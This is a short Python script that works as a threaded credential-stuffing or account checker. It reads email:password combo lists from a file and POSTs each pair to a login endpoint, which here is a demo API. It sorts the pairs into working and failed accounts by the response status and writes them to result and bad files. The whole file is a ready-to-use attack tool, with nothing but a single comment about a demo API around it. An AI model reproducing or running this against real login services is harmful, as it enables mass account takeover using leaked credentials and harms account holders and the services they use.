import requests
import threading
from colorama import Fore

url = "https://reqres.in/api/login"

read_combo = open("combo.txt", "r")
combo = read_combo.readlines()

for email_pass in combo:
    email = email_pass.split(":")[0] # email only
    password = email_pass.split(":")[1] # password only

    def data_payload(email, password):
        payload = {
            "email": email, # email
            "password": password # password
        }
        headers = {
            # Don't need request headers for this demo api
        }
        response =  requests.post(url, data=payload, headers=headers) # post request
        if response.status_code == 200: # If statement for checking if status code is 200
            print(Fore.GREEN + response.text)
            with open("result.txt", "a") as f:
                format = f"{email}:{password}"
                f.writelines(format)
        else: # else statement for checking if status code is not 200
            print(Fore.RED + "Bad Account")
            with open("bad.txt", "a") as f:
                format = f"{email}:{password}"
                f.writelines(format)
    if __name__ == "__main__": # threading part
        response_thread = threading.Thread(target = data_payload, args=(email, password))
        response_thread.start()
input("") # using input to not close the program automatically
